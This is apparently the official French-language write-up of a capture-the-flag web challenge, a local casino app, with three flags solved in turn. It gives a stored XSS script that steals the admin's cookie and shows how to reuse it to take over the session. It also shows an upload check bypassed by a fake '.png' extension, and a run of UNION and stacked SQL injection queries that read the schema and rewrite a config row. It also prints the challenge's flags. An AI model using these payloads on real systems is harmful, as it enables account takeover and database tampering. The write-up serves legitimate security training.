# Official writeup of CS Games Challenge 1

This is the official writeup of CS Games Challenge 1. Please tryhard before reading this.

# Flag 1 : XSS injection

Code d'affichage des reviews. On peut injecter du code directement.

```html
<div class="d-flex flex-column">
    <h3 class="mt-2"><%-review.username %></h3>
    <p><%-review.text %></p>
    <p class="mt-auto">
        le <%-review.date.getDate() %> / <%-review.date.getMonth() %> / <%-review.date.getFullYear() %>
    </p>
</div>
```

On peut modifier la fonction qui envoie une review pour envoyer le token de l'administrateur.

```html
<script>
    console.log(document.cookie);
    fetch("/api/user/review", {
        method: "POST",
        headers: {
            Accept: "application/json, text/plain, */*",
            "Content-Type": "application/json",
        },
        body: JSON.stringify({
            review: document.cookie,
        }),
    });
</script>
```

Quand un utilisateur visitera le site, il y créra une review avec comme texte son cookie, pas discret mais efficace ! En attendant un peu, l'administrateur ira sur le site.
Une fois le cookie affiché. On ajoute le cookie dans notre navigateur. Allons dans les outils pour développeurs, lancer dans la console :

```js
document.cookie = "AUTH_COOKIE= le cookie volé";
```

Actualisons la page, et on est connecté en administrateur !
Allons sur la page du profil, en utilisant le nom de l'administrateur, on trouve le flag : `flag{frank_catton}`

# Flag 2 : File upload et SQL injection

## Upload du fichier de configuration

La test de l'extention de l'image de la photo de profil est le suivant :

```js
    if (path.extname(req.file.originalname).toLowerCase() === ".png") {
```

On peut outrepasser le test en changeant l'extension de notre fichier en ".png" ! En effet le controle est seulement sur l'extension et non le contenu ! on peut donc upload n'importe quel type de fichier.

## Mise à jour de la configuration

Connecté en administrateur sur l'onglet des horaires, on peut faire une injection SQL avec le champ `week`.

Voici une liste de requêtes pour récupérer des informations :

```SQL
0' UNION SELECT username FROM users WHERE '1'='1
-- http://localhost:3000/profile?pre=shifts&week=0' UNION SELECT table_schema FROM information_schema.tables WHERE '1'='1
-- erreur sur le nombre de colonnes, une injection est possible
-- NB : information_schema.tables est une table qui regroupe toutes les tables possibles, elle est toujours présente

0' UNION SELECT table_schema, table_name, table_name, table_name, table_name, table_name FROM information_schema.tables WHERE '1'='1
--  http://localhost:3000/profile?pre=shifts&week=0' UNION SELECT table_schema, table_name,table_name,table_name,table_name,table_name FROM information_schema.tables WHERE '1'='1
-- On ajoute des colonnes jusqu'à ne plus avoir d'erreur, ici c'est 6 !
-- On trouve les tables avec le schema ctf1, c'est surement celles qui nous intéressent !

0' UNION SELECT table_schema, table_name, COLUMN_NAME, table_name, table_name, table_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'config
-- http://localhost:3000/profile?pre=shifts&week=0' UNION SELECT table_schema, table_name,COLUMN_NAME,table_name,table_name,table_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'config
-- On récupère les colonnes de la table `config`

0' UNION SELECT config_id, attribute, value, value, value, value FROM config WHERE '1'='1
-- http://localhost:3000/profile?pre=shifts&week=0' UNION SELECT config_id, attribute, value, value, value, value FROM config WHERE '1'='1
-- On trouve la ligne slots_config, la valeur correspond a un nom de fichier : `/slots_config.conf` mettons le à jour !
-- Si on regarde le chemin de notre photo de profil, il est a http://localhost:3000/public/slots_config.conf.png

0' UNION SELECT config_id, attribute, value, value, value, value FROM config WHERE '1'='1'; UPDATE config SET value = '/public/slots_config.conf.png' WHERE attribute='slots_config
-- http://localhost:3000/profile?pre=shifts&week=0' UNION SELECT config_id, attribute, value, value, value, value FROM config WHERE '1'='1'; UPDATE config SET value = '/public/slots_config.conf.png' WHERE attribute='slots_config
-- l'affichage est complètement détruit car on fait 2 requetes, mais on peut voir qu'on a mit a jour une ligne
-- On relance la requete précédente pour voir les résultats... c'est à jour !
-- On peut utiliser le bouton pour voir si le logiciel est à jour, on trouve le flag : `flag{#N1ce:PicTure}`
```


# Flag 3 : Bruteforce
Le numéro de série est le hash de la position de la machine dans le casino. Trouvons la liste des machines et leur position. On réutilise notre injection pour la table des slots

```SQL
0' UNION SELECT table_schema, table_name, COLUMN_NAME, table_name, table_name, table_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'slots
-- http://localhost:3000/profile?pre=shifts&week=0' UNION SELECT table_schema, table_name, COLUMN_NAME, table_name, table_name, table_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'slots
-- On récupère les colonnes de la table `slots`

0' UNION SELECT position, balance, balance, balance, balance, balance FROM slots WHERE '1'='1
-- http://localhost:3000/profile?pre=shifts&week=0' UNION SELECT position, balance, balance, balance, balance, balance FROM slots WHERE '1'='1
-- On récupère la liste des position

0' UNION SELECT config_id, attribute, value, value, value, value FROM config WHERE '1'='1
-- http://localhost:3000/profile?pre=shifts&week=0' UNION SELECT config_id, attribute, value, value, value, value FROM config WHERE '1'='1
-- On trouve la ligne serial_number_derivation, qui correspond a la fonction pour hashage utilisée pour dériver le numéro de série
```

Pour chaque position, on calcule son SHA256, on obtien 1 seul match : ...
Allons jouer ! On change l'id de la machine dans l'url de jeu : http://localhost:3000/slots/`...`
On joue et on obtien le flag : flag{WP_D@ny!}